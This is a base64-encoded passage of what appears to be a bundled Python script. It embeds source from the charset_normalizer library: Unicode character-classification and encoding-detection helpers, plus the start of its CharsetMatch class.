ZVxuICAgIHJldHVybiAoXG4gICAgICAgICJXSVRIIEdSQVZFIiBpbiBkZXNjcmlwdGlvblxuICAgICAgICBvciAiV0lUSCBBQ1VURSIgaW4gZGVzY3JpcHRpb25cbiAgICAgICAgb3IgIldJVEggQ0VESUxMQSIgaW4gZGVzY3JpcHRpb25cbiAgICAgICAgb3IgIldJVEggRElBRVJFU0lTIiBpbiBkZXNjcmlwdGlvblxuICAgICAgICBvciAiV0lUSCBDSVJDVU1GTEVYIiBpbiBkZXNjcmlwdGlvblxuICAgICAgICBvciAiV0lUSCBUSUxERSIgaW4gZGVzY3JpcHRpb25cbiAgICApXG5cblxuQGxydV9jYWNoZShtYXhzaXplPVVURjhfTUFYSU1BTF9BTExPQ0FUSU9OKVxuZGVmIHJlbW92ZV9hY2NlbnQoY2hhcmFjdGVyOiBzdHIpIC0+IHN0cjpcbiAgICBkZWNvbXBvc2VkID0gdW5pY29kZWRhdGEuZGVjb21wb3NpdGlvbihjaGFyYWN0ZXIpICAjIHR5cGU6IHN0clxuICAgIGlmIG5vdCBkZWNvbXBvc2VkOlxuICAgICAgICByZXR1cm4gY2hhcmFjdGVyXG5cbiAgICBjb2RlcyA9IGRlY29tcG9zZWQuc3BsaXQoIiAiKSAgIyB0eXBlOiBMaXN0W3N0cl1cblxuICAgIHJldHVybiBjaHIoaW50KGNvZGVzWzBdLCAxNikpXG5cblxuQGxydV9jYWNoZShtYXhzaXplPVVURjhfTUFYSU1BTF9BTExPQ0FUSU9OKVxuZGVmIHVuaWNvZGVfcmFuZ2UoY2hhcmFjdGVyOiBzdHIpIC0+IE9wdGlvbmFsW3N0cl06XG4gICAgIiIiXG4gICAgUmV0cmlldmUgdGhlIFVuaWNvZGUgcmFuZ2Ugb2ZmaWNpYWwgbmFtZSBmcm9tIGEgc2luZ2xlIGNoYXJhY3Rlci5cbiAgICAiIiJcbiAgICBjaGFyYWN0ZXJfb3JkID0gb3JkKGNoYXJhY3RlcikgICMgdHlwZTogaW50XG5cbiAgICBmb3IgcmFuZ2VfbmFtZSwgb3JkX3JhbmdlIGluIFVOSUNPREVfUkFOR0VTX0NPTUJJTkVELml0ZW1zKCk6XG4gICAgICAgIGlmIGNoYXJhY3Rlcl9vcmQgaW4gb3JkX3JhbmdlOlxuICAgICAgICAgICAgcmV0dXJuIHJhbmdlX25hbWVcblxuICAgIHJldHVybiBOb25lXG5cblxuQGxydV9jYWNoZShtYXhzaXplPVVURjhfTUFYSU1BTF9BTExPQ0FUSU9OKVxuZGVmIGlzX2xhdGluKGNoYXJhY3Rlcjogc3RyKSAtPiBib29sOlxuICAgIHRyeTpcbiAgICAgICAgZGVzY3JpcHRpb24gPSB1bmljb2RlZGF0YS5uYW1lKGNoYXJhY3RlcikgICMgdHlwZTogc3RyXG4gICAgZXhjZXB0IFZhbHVlRXJyb3I6XG4gICAgICAgIHJldHVybiBGYWxzZVxuICAgIHJldHVybiAiTEFUSU4iIGluIGRlc2NyaXB0aW9uXG5cblxuZGVmIGlzX2FzY2lpKGNoYXJhY3Rlcjogc3RyKSAtPiBib29sOlxuICAgIHRyeTpcbiAgICAgICAgY2hhcmFjdGVyLmVuY29kZSgiYXNjaWkiKVxuICAgIGV4Y2VwdCBVbmljb2RlRW5jb2RlRXJyb3I6XG4gICAgICAgIHJldHVybiBGYWxzZVxuICAgIHJldHVybiBUcnVlXG5cblxuQGxydV9jYWNoZShtYXhzaXplPVVURjhfTUFYSU1BTF9BTExPQ0FUSU9OKVxuZGVmIGlzX3B1bmN0dWF0aW9uKGNoYXJhY3Rlcjogc3RyKSAtPiBib29sOlxuICAgIGNoYXJhY3Rlcl9jYXRlZ29yeSA9IHVuaWNvZGVkYXRhLmNhdGVnb3J5KGNoYXJhY3RlcikgICMgdHlwZTogc3RyXG5cbiAgICBpZiAiUCIgaW4gY2hhcmFjdGVyX2NhdGVnb3J5OlxuICAgICAgICByZXR1cm4gVHJ1ZVxuXG4gICAgY2hhcmFjdGVyX3JhbmdlID0gdW5pY29kZV9yYW5nZShjaGFyYWN0ZXIpICAjIHR5cGU6IE9wdGlvbmFsW3N0cl1cblxuICAgIGlmIGNoYXJhY3Rlcl9yYW5nZSBpcyBOb25lOlxuICAgICAgICByZXR1cm4gRmFsc2VcblxuICAgIHJldHVybiAiUHVuY3R1YXRpb24iIGluIGNoYXJhY3Rlcl9yYW5nZVxuXG5cbkBscnVfY2FjaGUobWF4c2l6ZT1VVEY4X01BWElNQUxfQUxMT0NBVElPTilcbmRlZiBpc19zeW1ib2woY2hhcmFjdGVyOiBzdHIpIC0+IGJvb2w6XG4gICAgY2hhcmFjdGVyX2NhdGVnb3J5ID0gdW5pY29kZWRhdGEuY2F0ZWdvcnkoY2hhcmFjdGVyKSAgIyB0eXBlOiBzdHJcblxuICAgIGlmICJTIiBpbiBjaGFyYWN0ZXJfY2F0ZWdvcnkgb3IgIk4iIGluIGNoYXJhY3Rlcl9jYXRlZ29yeTpcbiAgICAgICAgcmV0dXJuIFRydWVcblxuICAgIGNoYXJhY3Rlcl9yYW5nZSA9IHVuaWNvZGVfcmFuZ2UoY2hhcmFjdGVyKSAgIyB0eXBlOiBPcHRpb25hbFtzdHJdXG5cbiAgICBpZiBjaGFyYWN0ZXJfcmFuZ2UgaXMgTm9uZTpcbiAgICAgICAgcmV0dXJuIEZhbHNlXG5cbiAgICByZXR1cm4gIkZvcm1zIiBpbiBjaGFyYWN0ZXJfcmFuZ2VcblxuXG5AbHJ1X2NhY2hlKG1heHNpemU9VVRGOF9NQVhJTUFMX0FMTE9DQVRJT04pXG5kZWYgaXNfZW1vdGljb24oY2hhcmFjdGVyOiBzdHIpIC0+IGJvb2w6XG4gICAgY2hhcmFjdGVyX3JhbmdlID0gdW5pY29kZV9yYW5nZShjaGFyYWN0ZXIpICAjIHR5cGU6IE9wdGlvbmFsW3N0cl1cblxuICAgIGlmIGNoYXJhY3Rlcl9yYW5nZSBpcyBOb25lOlxuICAgICAgICByZXR1cm4gRmFsc2VcblxuICAgIHJldHVybiAiRW1vdGljb25zIiBpbiBjaGFyYWN0ZXJfcmFuZ2VcblxuXG5AbHJ1X2NhY2hlKG1heHNpemU9VVRGOF9NQVhJTUFMX0FMTE9DQVRJT04pXG5kZWYgaXNfc2VwYXJhdG9yKGNoYXJhY3Rlcjogc3RyKSAtPiBib29sOlxuICAgIGlmIGNoYXJhY3Rlci5pc3NwYWNlKCkgb3IgY2hhcmFjdGVyIGluIHsiXHhlZlx4YmRceDljIiwgIisiLCAiLCIsICI7IiwgIjwiLCAiPiJ9OlxuICAgICAgICByZXR1cm4gVHJ1ZVxuXG4gICAgY2hhcmFjdGVyX2NhdGVnb3J5ID0gdW5pY29kZWRhdGEuY2F0ZWdvcnkoY2hhcmFjdGVyKSAgIyB0eXBlOiBzdHJcblxuICAgIHJldHVybiAiWiIgaW4gY2hhcmFjdGVyX2NhdGVnb3J5XG5cblxuQGxydV9jYWNoZShtYXhzaXplPVVURjhfTUFYSU1BTF9BTExPQ0FUSU9OKVxuZGVmIGlzX2Nhc2VfdmFyaWFibGUoY2hhcmFjdGVyOiBzdHIpIC0+IGJvb2w6XG4gICAgcmV0dXJuIGNoYXJhY3Rlci5pc2xvd2VyKCkgIT0gY2hhcmFjdGVyLmlzdXBwZXIoKVxuXG5cbmRlZiBpc19wcml2YXRlX3VzZV9vbmx5KGNoYXJhY3Rlcjogc3RyKSAtPiBib29sOlxuICAgIGNoYXJhY3Rlcl9jYXRlZ29yeSA9IHVuaWNvZGVkYXRhLmNhdGVnb3J5KGNoYXJhY3RlcikgICMgdHlwZTogc3RyXG5cbiAgICByZXR1cm4gY2hhcmFjdGVyX2NhdGVnb3J5ID09ICJDbyJcblxuXG5AbHJ1X2NhY2hlKG1heHNpemU9VVRGOF9NQVhJTUFMX0FMTE9DQVRJT04pXG5kZWYgaXNfY2prKGNoYXJhY3Rlcjogc3RyKSAtPiBib29sOlxuICAgIHRyeTpcbiAgICAgICAgY2hhcmFjdGVyX25hbWUgPSB1bmljb2RlZGF0YS5uYW1lKGNoYXJhY3RlcilcbiAgICBleGNlcHQgVmFsdWVFcnJvcjpcbiAgICAgICAgcmV0dXJuIEZhbHNlXG5cbiAgICByZXR1cm4gIkNKSyIgaW4gY2hhcmFjdGVyX25hbWVcblxuXG5AbHJ1X2NhY2hlKG1heHNpemU9VVRGOF9NQVhJTUFMX0FMTE9DQVRJT04pXG5kZWYgaXNfaGlyYWdhbmEoY2hhcmFjdGVyOiBzdHIpIC0+IGJvb2w6XG4gICAgdHJ5OlxuICAgICAgICBjaGFyYWN0ZXJfbmFtZSA9IHVuaWNvZGVkYXRhLm5hbWUoY2hhcmFjdGVyKVxuICAgIGV4Y2VwdCBWYWx1ZUVycm9yOlxuICAgICAgICByZXR1cm4gRmFsc2VcblxuICAgIHJldHVybiAiSElSQUdBTkEiIGluIGNoYXJhY3Rlcl9uYW1lXG5cblxuQGxydV9jYWNoZShtYXhzaXplPVVURjhfTUFYSU1BTF9BTExPQ0FUSU9OKVxuZGVmIGlzX2thdGFrYW5hKGNoYXJhY3Rlcjogc3RyKSAtPiBib29sOlxuICAgIHRyeTpcbiAgICAgICAgY2hhcmFjdGVyX25hbWUgPSB1bmljb2RlZGF0YS5uYW1lKGNoYXJhY3RlcilcbiAgICBleGNlcHQgVmFsdWVFcnJvcjpcbiAgICAgICAgcmV0dXJuIEZhbHNlXG5cbiAgICByZXR1cm4gIktBVEFLQU5BIiBpbiBjaGFyYWN0ZXJfbmFtZVxuXG5cbkBscnVfY2FjaGUobWF4c2l6ZT1VVEY4X01BWElNQUxfQUxMT0NBVElPTilcbmRlZiBpc19oYW5ndWwoY2hhcmFjdGVyOiBzdHIpIC0+IGJvb2w6XG4gICAgdHJ5OlxuICAgICAgICBjaGFyYWN0ZXJfbmFtZSA9IHVuaWNvZGVkYXRhLm5hbWUoY2hhcmFjdGVyKVxuICAgIGV4Y2VwdCBWYWx1ZUVycm9yOlxuICAgICAgICByZXR1cm4gRmFsc2VcblxuICAgIHJldHVybiAiSEFOR1VMIiBpbiBjaGFyYWN0ZXJfbmFtZVxuXG5cbkBscnVfY2FjaGUobWF4c2l6ZT1VVEY4X01BWElNQUxfQUxMT0NBVElPTilcbmRlZiBpc190aGFpKGNoYXJhY3Rlcjogc3RyKSAtPiBib29sOlxuICAgIHRyeTpcbiAgICAgICAgY2hhcmFjdGVyX25hbWUgPSB1bmljb2RlZGF0YS5uYW1lKGNoYXJhY3RlcilcbiAgICBleGNlcHQgVmFsdWVFcnJvcjpcbiAgICAgICAgcmV0dXJuIEZhbHNlXG5cbiAgICByZXR1cm4gIlRIQUkiIGluIGNoYXJhY3Rlcl9uYW1lXG5cblxuQGxydV9jYWNoZShtYXhzaXplPWxlbihVTklDT0RFX1JBTkdFU19DT01CSU5FRCkpXG5kZWYgaXNfdW5pY29kZV9yYW5nZV9zZWNvbmRhcnkocmFuZ2VfbmFtZTogc3RyKSAtPiBib29sOlxuICAgIHJldHVybiBhbnkoa2V5d29yZCBpbiByYW5nZV9uYW1lIGZvciBrZXl3b3JkIGluIFVOSUNPREVfU0VDT05EQVJZX1JBTkdFX0tFWVdPUkQpXG5cblxuZGVmIGFueV9zcGVjaWZpZWRfZW5jb2Rpbmcoc2VxdWVuY2U6IGJ5dGVzLCBzZWFyY2hfem9uZTogaW50ID0gNDA5NikgLT4gT3B0aW9uYWxbc3RyXTpcbiAgICAiIiJcbiAgICBFeHRyYWN0IHVzaW5nIEFTQ0lJLW9ubHkgZGVjb2RlciBhbnkgc3BlY2lmaWVkIGVuY29kaW5nIGluIHRoZSBmaXJzdCBuLWJ5dGVzLlxuICAgICIiIlxuICAgIGlmIG5vdCBpc2luc3RhbmNlKHNlcXVlbmNlLCBieXRlcyk6XG4gICAgICAgIHJhaXNlIFR5cGVFcnJvclxuXG4gICAgc2VxX2xlbiA9IGxlbihzZXF1ZW5jZSkgICMgdHlwZTogaW50XG5cbiAgICByZXN1bHRzID0gZmluZGFsbChcbiAgICAgICAgUkVfUE9TU0lCTEVfRU5DT0RJTkdfSU5ESUNBVElPTixcbiAgICAgICAgc2VxdWVuY2VbOiBtaW4oc2VxX2xlbiwgc2VhcmNoX3pvbmUpXS5kZWNvZGUoImFzY2lpIiwgZXJyb3JzPSJpZ25vcmUiKSxcbiAgICApICAjIHR5cGU6IExpc3Rbc3RyXVxuXG4gICAgaWYgbGVuKHJlc3VsdHMpID09IDA6XG4gICAgICAgIHJldHVybiBOb25lXG5cbiAgICBmb3Igc3BlY2lmaWVkX2VuY29kaW5nIGluIHJlc3VsdHM6XG4gICAgICAgIHNwZWNpZmllZF9lbmNvZGluZyA9IHNwZWNpZmllZF9lbmNvZGluZy5sb3dlcigpLnJlcGxhY2UoIi0iLCAiXyIpXG5cbiAgICAgICAgZm9yIGVuY29kaW5nX2FsaWFzLCBlbmNvZGluZ19pYW5hIGluIGFsaWFzZXMuaXRlbXMoKTpcbiAgICAgICAgICAgIGlmIGVuY29kaW5nX2FsaWFzID09IHNwZWNpZmllZF9lbmNvZGluZzpcbiAgICAgICAgICAgICAgICByZXR1cm4gZW5jb2RpbmdfaWFuYVxuICAgICAgICAgICAgaWYgZW5jb2RpbmdfaWFuYSA9PSBzcGVjaWZpZWRfZW5jb2Rpbmc6XG4gICAgICAgICAgICAgICAgcmV0dXJuIGVuY29kaW5nX2lhbmFcblxuICAgIHJldHVybiBOb25lXG5cblxuQGxydV9jYWNoZShtYXhzaXplPTEyOClcbmRlZiBpc19tdWx0aV9ieXRlX2VuY29kaW5nKG5hbWU6IHN0cikgLT4gYm9vbDpcbiAgICAiIiJcbiAgICBWZXJpZnkgaXMgYSBzcGVjaWZpYyBlbmNvZGluZyBpcyBhIG11bHRpIGJ5dGUgb25lIGJhc2VkIG9uIGl0IElBTkEgbmFtZVxuICAgICIiIlxuICAgIHJldHVybiBuYW1lIGluIHtcbiAgICAgICAgInV0Zl84IixcbiAgICAgICAgInV0Zl84X3NpZyIsXG4gICAgICAgICJ1dGZfMTYiLFxuICAgICAgICAidXRmXzE2X2JlIixcbiAgICAgICAgInV0Zl8xNl9sZSIsXG4gICAgICAgICJ1dGZfMzIiLFxuICAgICAgICAidXRmXzMyX2xlIixcbiAgICAgICAgInV0Zl8zMl9iZSIsXG4gICAgICAgICJ1dGZfNyIsXG4gICAgfSBvciBpc3N1YmNsYXNzKFxuICAgICAgICBpbXBvcnRsaWIuaW1wb3J0X21vZHVsZSgiZW5jb2RpbmdzLnt9Ii5mb3JtYXQobmFtZSkpLkluY3JlbWVudGFsRGVjb2RlciwgICMgdHlwZTogaWdub3JlXG4gICAgICAgIE11bHRpYnl0ZUluY3JlbWVudGFsRGVjb2RlcixcbiAgICApXG5cblxuZGVmIGlkZW50aWZ5X3NpZ19vcl9ib20oc2VxdWVuY2U6IGJ5dGVzKSAtPiBUdXBsZVtPcHRpb25hbFtzdHJdLCBieXRlc106XG4gICAgIiIiXG4gICAgSWRlbnRpZnkgYW5kIGV4dHJhY3QgU0lHL0JPTSBpbiBnaXZlbiBzZXF1ZW5jZS5cbiAgICAiIiJcblxuICAgIGZvciBpYW5hX2VuY29kaW5nIGluIEVOQ09ESU5HX01BUktTOlxuICAgICAgICBtYXJrcyA9IEVOQ09ESU5HX01BUktTW2lhbmFfZW5jb2RpbmddICAjIHR5cGU6IFVuaW9uW2J5dGVzLCBMaXN0W2J5dGVzXV1cblxuICAgICAgICBpZiBpc2luc3RhbmNlKG1hcmtzLCBieXRlcyk6XG4gICAgICAgICAgICBtYXJrcyA9IFttYXJrc11cblxuICAgICAgICBmb3IgbWFyayBpbiBtYXJrczpcbiAgICAgICAgICAgIGlmIHNlcXVlbmNlLnN0YXJ0c3dpdGgobWFyayk6XG4gICAgICAgICAgICAgICAgcmV0dXJuIGlhbmFfZW5jb2RpbmcsIG1hcmtcblxuICAgIHJldHVybiBOb25lLCBiIiJcblxuXG5kZWYgc2hvdWxkX3N0cmlwX3NpZ19vcl9ib20oaWFuYV9lbmNvZGluZzogc3RyKSAtPiBib29sOlxuICAgIHJldHVybiBpYW5hX2VuY29kaW5nIG5vdCBpbiB7InV0Zl8xNiIsICJ1dGZfMzIifVxuXG5cbmRlZiBpYW5hX25hbWUoY3BfbmFtZTogc3RyLCBzdHJpY3Q6IGJvb2wgPSBUcnVlKSAtPiBzdHI6XG4gICAgY3BfbmFtZSA9IGNwX25hbWUubG93ZXIoKS5yZXBsYWNlKCItIiwgIl8iKVxuXG4gICAgZm9yIGVuY29kaW5nX2FsaWFzLCBlbmNvZGluZ19pYW5hIGluIGFsaWFzZXMuaXRlbXMoKTpcbiAgICAgICAgaWYgY3BfbmFtZSBpbiBbZW5jb2RpbmdfYWxpYXMsIGVuY29kaW5nX2lhbmFdOlxuICAgICAgICAgICAgcmV0dXJuIGVuY29kaW5nX2lhbmFcblxuICAgIGlmIHN0cmljdDpcbiAgICAgICAgcmFpc2UgVmFsdWVFcnJvcigiVW5hYmxlIHRvIHJldHJpZXZlIElBTkEgZm9yIFwne31cJyIuZm9ybWF0KGNwX25hbWUpKVxuXG4gICAgcmV0dXJuIGNwX25hbWVcblxuXG5kZWYgcmFuZ2Vfc2NhbihkZWNvZGVkX3NlcXVlbmNlOiBzdHIpIC0+IExpc3Rbc3RyXTpcbiAgICByYW5nZXMgPSBzZXQoKSAgIyB0eXBlOiBTZXRbc3RyXVxuXG4gICAgZm9yIGNoYXJhY3RlciBpbiBkZWNvZGVkX3NlcXVlbmNlOlxuICAgICAgICBjaGFyYWN0ZXJfcmFuZ2UgPSB1bmljb2RlX3JhbmdlKGNoYXJhY3RlcikgICMgdHlwZTogT3B0aW9uYWxbc3RyXVxuXG4gICAgICAgIGlmIGNoYXJhY3Rlcl9yYW5nZSBpcyBOb25lOlxuICAgICAgICAgICAgY29udGludWVcblxuICAgICAgICByYW5nZXMuYWRkKGNoYXJhY3Rlcl9yYW5nZSlcblxuICAgIHJldHVybiBsaXN0KHJhbmdlcylcblxuXG5kZWYgY3Bfc2ltaWxhcml0eShpYW5hX25hbWVfYTogc3RyLCBpYW5hX25hbWVfYjogc3RyKSAtPiBmbG9hdDpcblxuICAgIGlmIGlzX211bHRpX2J5dGVfZW5jb2RpbmcoaWFuYV9uYW1lX2EpIG9yIGlzX211bHRpX2J5dGVfZW5jb2RpbmcoaWFuYV9uYW1lX2IpOlxuICAgICAgICByZXR1cm4gMC4wXG5cbiAgICBkZWNvZGVyX2EgPSBpbXBvcnRsaWIuaW1wb3J0X21vZHVsZSgiZW5jb2RpbmdzLnt9Ii5mb3JtYXQoaWFuYV9uYW1lX2EpKS5JbmNyZW1lbnRhbERlY29kZXIgICMgdHlwZTogaWdub3JlXG4gICAgZGVjb2Rlcl9iID0gaW1wb3J0bGliLmltcG9ydF9tb2R1bGUoImVuY29kaW5ncy57fSIuZm9ybWF0KGlhbmFfbmFtZV9iKSkuSW5jcmVtZW50YWxEZWNvZGVyICAjIHR5cGU6IGlnbm9yZVxuXG4gICAgaWRfYSA9IGRlY29kZXJfYShlcnJvcnM9Imlnbm9yZSIpICAjIHR5cGU6IEluY3JlbWVudGFsRGVjb2RlclxuICAgIGlkX2IgPSBkZWNvZGVyX2IoZXJyb3JzPSJpZ25vcmUiKSAgIyB0eXBlOiBJbmNyZW1lbnRhbERlY29kZXJcblxuICAgIGNoYXJhY3Rlcl9tYXRjaF9jb3VudCA9IDAgICMgdHlwZTogaW50XG5cbiAgICBmb3IgaSBpbiByYW5nZSgyNTUpOlxuICAgICAgICB0b19iZV9kZWNvZGVkID0gYnl0ZXMoW2ldKSAgIyB0eXBlOiBieXRlc1xuICAgICAgICBpZiBpZF9hLmRlY29kZSh0b19iZV9kZWNvZGVkKSA9PSBpZF9iLmRlY29kZSh0b19iZV9kZWNvZGVkKTpcbiAgICAgICAgICAgIGNoYXJhY3Rlcl9tYXRjaF9jb3VudCArPSAxXG5cbiAgICByZXR1cm4gY2hhcmFjdGVyX21hdGNoX2NvdW50IC8gMjU0XG5cblxuZGVmIGlzX2NwX3NpbWlsYXIoaWFuYV9uYW1lX2E6IHN0ciwgaWFuYV9uYW1lX2I6IHN0cikgLT4gYm9vbDpcbiAgICAiIiJcbiAgICBEZXRlcm1pbmUgaWYgdHdvIGNvZGUgcGFnZSBhcmUgYXQgbGVhc3QgODAlIHNpbWlsYXIuIElBTkFfU1VQUE9SVEVEX1NJTUlMQVIgZGljdCB3YXMgZ2VuZXJhdGVkIHVzaW5nXG4gICAgdGhlIGZ1bmN0aW9uIGNwX3NpbWlsYXJpdHkuXG4gICAgIiIiXG4gICAgcmV0dXJuIChcbiAgICAgICAgaWFuYV9uYW1lX2EgaW4gSUFOQV9TVVBQT1JURURfU0lNSUxBUlxuICAgICAgICBhbmQgaWFuYV9uYW1lX2IgaW4gSUFOQV9TVVBQT1JURURfU0lNSUxBUltpYW5hX25hbWVfYV1cbiAgICApXG5cblxuZGVmIHNldF9sb2dnaW5nX2hhbmRsZXIoXG4gICAgbmFtZTogc3RyID0gImNoYXJzZXRfbm9ybWFsaXplciIsXG4gICAgbGV2ZWw6IGludCA9IGxvZ2dpbmcuSU5GTyxcbiAgICBmb3JtYXRfc3RyaW5nOiBzdHIgPSAiJShhc2N0aW1lKXMgfCAlKGxldmVsbmFtZSlzIHwgJShtZXNzYWdlKXMiLFxuKSAtPiBOb25lOlxuXG4gICAgbG9nZ2VyID0gbG9nZ2luZy5nZXRMb2dnZXIobmFtZSlcbiAgICBsb2dnZXIuc2V0TGV2ZWwobGV2ZWwpXG5cbiAgICBoYW5kbGVyID0gbG9nZ2luZy5TdHJlYW1IYW5kbGVyKClcbiAgICBoYW5kbGVyLnNldEZvcm1hdHRlcihsb2dnaW5nLkZvcm1hdHRlcihmb3JtYXRfc3RyaW5nKSlcbiAgICBsb2dnZXIuYWRkSGFuZGxlcihoYW5kbGVyKVxuJykKICAgIF9fc3RpY2t5dGFwZV93cml0ZV9tb2R1bGUoJ2NoYXJzZXRfbm9ybWFsaXplci9tb2RlbHMucHknLCBiJ2ltcG9ydCB3YXJuaW5nc1xuZnJvbSBjb2xsZWN0aW9ucyBpbXBvcnQgQ291bnRlclxuZnJvbSBlbmNvZGluZ3MuYWxpYXNlcyBpbXBvcnQgYWxpYXNlc1xuZnJvbSBoYXNobGliIGltcG9ydCBzaGEyNTZcbmZyb20ganNvbiBpbXBvcnQgZHVtcHNcbmZyb20gcmUgaW1wb3J0IHN1YlxuZnJvbSB0eXBpbmcgaW1wb3J0IEFueSwgRGljdCwgSXRlcmF0b3IsIExpc3QsIE9wdGlvbmFsLCBUdXBsZSwgVW5pb25cblxuZnJvbSAuY29uc3RhbnQgaW1wb3J0IE5PVF9QUklOVEFCTEVfUEFUVEVSTiwgVE9PX0JJR19TRVFVRU5DRVxuZnJvbSAubWQgaW1wb3J0IG1lc3NfcmF0aW9cbmZyb20gLnV0aWxzIGltcG9ydCBpYW5hX25hbWUsIGlzX211bHRpX2J5dGVfZW5jb2RpbmcsIHVuaWNvZGVfcmFuZ2VcblxuXG5jbGFzcyBDaGFyc2V0TWF0Y2g6XG4gICAgZGVmIF9faW5pdF9fKFxuICAgICAgICBzZWxmLFxuICAgICAgICBwYXlsb2FkOiBieXRlcyxcbiAgICAgICAgZ3Vlc3NlZF9lbmNvZGluZzogc3RyLFxuICAgICAgICBtZWFuX21lc3NfcmF0aW86IGZsb2F0LFxuICAgICAgICBoYXNfc2lnX29yX2JvbTogYm9vbCxcbiAgICAgICAgbGFuZ3VhZ2VzOiAiQ29oZXJlbmNlTWF0Y2hlcyIsXG4gICAgICAgIGRlY29kZWRfcGF5bG9hZDogT3B0aW9uYWxbc3RyXSA9IE5vbmUsXG4gICAgKTpcbiAgICAgICAgc2VsZi5fcGF5bG9hZCA9IHBheWxvYWQgICMgdHlwZTogYnl0ZXNcblxuICAgICAgICBzZWxmLl9lbmNvZGluZyA9IGd1ZXNzZWRfZW5jb2RpbmcgICMgdHlwZTogc3RyXG4gICAgICAgIHNlbGYuX21lYW5fbWVzc19yYXRpbyA9IG1lYW5fbWVzc19yYXRpbyAgIyB0eXBlOiBmbG9hdFxuICAgICAgICBzZWxmLl9sYW5ndWFnZXMgPSBsYW5ndWFnZXMgICMgdHlwZTogQ29oZXJlbmNlTWF0Y2hlc1xuICAgICAgICBzZWxmLl9oYXNfc2lnX29yX2JvbSA9IGhhc19zaWdfb3JfYm9tICAjIHR5cGU6IGJvb2xcbiAgICAgICAgc2VsZi5fdW5pY29kZV9yYW5nZXMgPSBOb25lICAjIHR5cGU6IE9wdGlvbmFsW0xpc3Rbc3RyXV1cblxuICAgICAgICBzZWxmLl9sZWF2ZXMgPSBbXSAgIyB0eXBlOiBMaXN0W0NoYXJzZXRNYXRjaF1cbiAgICAgICAgc2VsZi5fbWVhbl9jb2hlcmVuY2VfcmF0aW8gPSAwLjAgICMgdHlwZTogZmxvYXRcblxuICAgICAgICBzZWxmLl9vdXRwdXRfcGF5bG9hZCA9IE5vbmUgICMgdHlwZTogT3B0aW9uYWxbYnl0ZXNdXG4gICAgICAgIHNlbGYuX291dHB1dF9lbmNvZGluZyA9IE5vbmUgICMgdHlwZTogT3B0aW9uYWxbc3RyXVxuXG4gICAgICAgIHNlbGYuX3N0cmluZyA9IGRlY29kZWRfcGF5bG9hZCAgIyB0eXBlOiBPcHRpb25hbFtzdHJdXG5cbiAgICBkZWYgX19lcV9fKHNlbGYsIG90aGVyOiBvYmplY3QpIC0+IGJvb2w6XG4gICAgICAgIGlmIG5vdCBpc2luc3RhbmNlKG90aGVyLCBDaGFyc2V0TWF0Y2gpOlxuICAgICAgICAgICAgcmFpc2UgVHlwZUVycm9yKFxuICAgICAgICAgICAgICAgICJfX2VxX18gY2Fubm90IGJlIGludm9rZWQgb24ge30gYW5kIHt9LiIuZm9ybWF0KFxuICAgICAgICAgICAgICAgICAgICBzdHIob3RoZXIuX19jbGFzc19fKSwgc3RyKHNlbGYuX19jbGFzc19fKVxuICAgICAgICAgICAgICAgIClcbiAgICAgICAgICAgIClcbiAgICAgICAgcmV0dXJuIHNlbGYuZW5jb2RpbmcgPT0gb3RoZXIuZW5jb2RpbmcgYW5kIHNlbGYuZmluZ2VycHJpbnQgPT0gb3RoZXIuZmluZ2VycHJpbnRcblxuICAgIGRlZiBfX2x0X18oc2VsZiwgb3RoZXI6IG9iamVjdCkgLT4gYm9vbDpcbiAgICAgICAgIiIiXG4gICAgICAgIEltcGxlbWVudGVkIHRvIG1ha2Ugc29ydGVkIGF2YWlsYWJsZSB1cG9uIENoYXJzZXRNYXRjaGVzIGl0ZW1zLlxuICAgICAgICAiIiJcbiAgICAgICAgaWYgbm90IGlzaW5zdGFuY2Uob3RoZXIsIENoYXJzZXRNYXRjaCk6XG4gICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yXG5cbiAgICAgICAgY2hhb3NfZGlmZmVyZW5jZSA9IGFicyhzZWxmLmNoYW9zIC0gb3RoZXIuY2hhb3MpICAjIHR5cGU6IGZsb2F0XG4gICAgICAgIGNvaGVyZW5jZV9kaWZmZXJlbmNlID0gYWJzKHNlbGYuY29oZXJlbmNlIC0gb3RoZXIuY29oZXJlbmNlKSAgIyB0eXBlOiBmbG9hdFxuXG4gICAgICAgICMgQmVsbG93IDElIGRpZmZlcmVuY2UgLS0+IFVzZSBDb2hlcmVuY2VcbiAgICAgICAgaWYgY2hhb3NfZGlmZmVyZW5jZSA8IDAuMDEgYW5kIGNvaGVyZW5jZV9kaWZmZXJlbmNlID4gMC4wMjpcbiAgICAgICAgICAgICMgV2hlbiBoYXZpbmcgYSB0b3VnaCBkZWNpc2lvbiwgdXNlIHRoZSByZXN1bHQgdGhhdCBkZWNvZGVkIGFzIG1hbnkgbXVsdGktYnl0ZSBhcyBwb3NzaWJsZS5cbiAgICAgICAgICAgIGlmIGNoYW9zX2RpZmZlcmVuY2UgPT0gMC4wIGFuZCBzZWxmLmNvaGVyZW5jZSA9PSBvdGhlci5jb2hlcmVuY2U6XG4gICAgICAgICAgICAgICAgcmV0dXJuIHNlbGYubXVsdGlfYnl0ZV91c2FnZSA+IG90aGVyLm11bHRpX2J5dGVfdXNhZ2VcbiAgICAgICAgICAgIHJldHVybiBzZWxmLmNvaGVyZW5jZSA+IG90aGVyLmNvaGVyZW5jZVxuXG4gICAgICAgIHJldHVybiBzZWxmLmNoYW9zIDwgb3RoZXIuY2hhb3NcblxuICAgIEBwcm9wZXJ0eVxuICAgIGRlZiBtdWx0aV9ieXRlX3VzYWdlKHNlbGYpIC0+IGZsb2F0OlxuICAgICAgICByZXR1cm4gMS4wIC0gbGVuKHN0cihzZWxmKSkgLyBsZW4oc2VsZi5yYXcpXG5cbiAgICBAcHJvcGVydHlcbiAgICBkZWYgY2hhb3Nfc2Vjb25kYXJ5X3Bhc3Moc2VsZikgLT4gZmxvYXQ6XG4gICAgICAgICIiIlxuICAgICAgICBDaGVjayBvbmNlIGFnYWluIGNoYW9zIGluIGRlY29kZWQgdGV4dCwgZXhjZXB0IHRoaXMgdGltZSwgd2l0aCBmdWxsIGNvbnRlbnQuXG4gICAgICAgIFVzZSB3aXRoIGNhdXRpb24sIHRoaXMgY2FuIGJlIHZlcnkgc2xvdy5cbiAgICAgICAgTm90aWNlOiBXaWxsIGJlIHJlbW92ZWQgaW4gMy4wXG4gICAgICAgICIiIlxuICAgICAgICB3YXJuaW5ncy53YXJuKFxuICAgICAgICAgICAgImNoYW9zX3NlY29uZGFyeV9wYXNzIGlzIGRlcHJlY2F0ZWQgYW5kIHdpbGwgYmUgcmVtb3ZlZCBpbiAzLjAiLFxuICAgICAgICAgICAgRGVwcmVjYXRpb25XYXJuaW5nLFxuICAgICAgICApXG4gICAgIC